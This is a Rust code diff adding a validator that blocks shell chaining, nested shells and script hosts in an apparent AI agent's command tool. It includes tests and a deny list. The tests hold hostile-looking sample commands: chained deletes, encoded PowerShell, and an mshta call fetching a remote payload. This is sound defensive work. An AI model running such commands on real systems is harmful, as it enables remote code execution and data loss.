@@ -1013,6 +1013,191 @@ fn decode_command_bytes(bytes: &[u8]) -> String {
     }
 }
 
+fn parse_command_executable(command: &str) -> (String, String) {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return (String::new(), String::new());
+    }
+    let first = trimmed.chars().next().unwrap_or_default();
+    if first == '"' || first == '\'' {
+        if let Some(end) = trimmed[1..].find(first) {
+            let executable = trimmed[1..end + 1].to_string();
+            let remainder = trimmed[end + 2..].trim().to_string();
+            return (executable, remainder);
+        }
+    }
+    let split_at = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
+    (
+        trimmed[..split_at].to_string(),
+        trimmed[split_at..].trim().to_string(),
+    )
+}
+
+fn shell_control_operator(command: &str, host: &str) -> Option<&'static str> {
+    let chars: Vec<char> = command.chars().collect();
+    let mut quote: Option<char> = None;
+    let mut index = 0usize;
+    while index < chars.len() {
+        let current = chars[index];
+        let next = chars.get(index + 1).copied().unwrap_or_default();
+        if current == '\r' || current == '\n' {
+            return Some("newline");
+        }
+        if host == "windows" && current == '^' && quote.is_none() {
+            index += 2;
+            continue;
+        }
+        if host != "windows" && current == '\\' && quote != Some('\'') {
+            index += 2;
+            continue;
+        }
+        if current == '\'' && quote != Some('"') {
+            quote = if quote == Some('\'') {
+                None
+            } else {
+                Some('\'')
+            };
+            index += 1;
+            continue;
+        }
+        if current == '"' && quote != Some('\'') {
+            quote = if quote == Some('"') { None } else { Some('"') };
+            index += 1;
+            continue;
+        }
+        if quote != Some('\'') && (current == '`' || (current == '$' && next == '(')) {
+            return Some(if current == '`' { "`" } else { "$(" });
+        }
+        if quote.is_none() {
+            match current {
+                '&' => return Some("&"),
+                '|' => return Some("|"),
+                ';' => return Some(";"),
+                '<' => return Some("<"),
+                '>' => return Some(">"),
+                _ => {}
+            }
+        }
+        index += 1;
+    }
+    None
+}
+
+fn validate_command_for_host(command: &str, host: &str) -> Result<(), String> {
+    if command.trim().is_empty() {
+        return Err("No command was provided.".to_string());
+    }
+    if let Some(operator) = shell_control_operator(command, host) {
+        return Err(format!(
+            "Raw shell control operator \"{}\" is not allowed. Use one structured command per tool call.",
+            operator
+        ));
+    }
+    let (executable, remainder) = parse_command_executable(command);
+    let normalized = executable.replace('\\', "/").to_lowercase();
+    let name = normalized
+        .rsplit('/')
+        .next()
+        .unwrap_or(&normalized)
+        .trim_end_matches(".exe");
+    if host == "windows" {
+        let nested_shell = matches!(
+            name,
+            "cmd" | "%comspec%" | "wscript" | "cscript" | "mshta" | "powershell" | "pwsh"
+        );
+        if nested_shell {
+            return Err(format!(
+                "Nested shell or script-host command \"{}\" is not allowed through the raw command adapter. Use a structured executable and argument list.",
+                executable
+            ));
+        }
+        if normalized.starts_with("/bin/") || matches!(name, "rm" | "sh" | "bash" | "zsh" | "sudo")
+        {
+            return Err(format!(
+                "Command \"{}\" is a POSIX command and cannot run through the Windows command adapter.",
+                executable
+            ));
+        }
+        let find_path = remainder.trim();
+        if name == "find"
+            && (find_path == "/"
+                || find_path.starts_with("/ ")
+                || find_path == "~"
+                || find_path.starts_with("~/")
+                || find_path.starts_with("~\\")
+                || find_path.starts_with("~ "))
+        {
+            return Err(
+                "POSIX find path syntax is not supported on Windows. Use native desktop file tools."
+                    .to_string(),
+            );
+        }
+    } else if matches!(name, "cmd" | "findstr" | "taskmgr") {
+        return Err(format!(
+            "Command \"{}\" is Windows-specific and cannot run on {}.",
+            executable, host
+        ));
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod command_platform_validation_tests {
+    use super::validate_command_for_host;
+
+    #[test]
+    fn rejects_posix_commands_on_windows() {
+        for command in ["find /", "find ~", "rm file.txt", "/bin/sh -c whoami"] {
+            assert!(
+                validate_command_for_host(command, "windows").is_err(),
+                "{}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_raw_shell_chaining_but_allows_quoted_text() {
+        for command in [
+            "echo ok & del file.txt",
+            "whoami && dir",
+            "echo ok | findstr ok",
+        ] {
+            assert!(
+                validate_command_for_host(command, "windows").is_err(),
+                "{}",
+                command
+            );
+        }
+        assert!(validate_command_for_host("echo \"a & b\"", "windows").is_ok());
+        assert!(validate_command_for_host("whoami", "windows").is_ok());
+    }
+
+    #[test]
+    fn rejects_nested_windows_shells_and_script_hosts() {
+        for command in [
+            "cmd.exe /c \"echo safe & whoami\"",
+            "%COMSPEC% /c \"echo safe & whoami\"",
+            "powershell.exe -NoProfile -Command \"Write-Output safe; whoami\"",
+            "pwsh -EncodedCommand ZQBjAGgAbwAgAHMAYQBmAGUA",
+            "powershell.exe -enc ZQBjAGgAbwAgAHMAYQBmAGUA",
+            "powershell.exe -enco ZQBjAGgAbwAgAHMAYQBmAGUA",
+            "powershell.exe /Command \"Write-Output safe; whoami\"",
+            "pwsh.exe -CommandWithArgs \"Write-Output safe; whoami\"",
+            "powershell.exe -File C:\\Temp\\job.ps1",
+            "wscript.exe unsafe.vbs",
+            "cscript unsafe.vbs",
+            "mshta.exe https://example.invalid/payload.hta",
+        ] {
+            assert!(
+                validate_command_for_host(command, "windows").is_err(),
+                "{}",
+                command
+            );
+        }
+    }
+}
+
 fn terminate_command_tree(child: &mut Child) {
     #[cfg(target_os = "windows")]
     {
@@ -1044,6 +1229,12 @@ fn run_command(
     } else {
         command.clone()
     };
+    if let Err(error) = validate_command_for_host(&command, std::env::consts::OS) {
+        return CommandResult {
+            success: false,
+            output: error,
+        };
+    }
     let cwd_path = cwd
         .as_ref()
         .map(|value| value.trim())
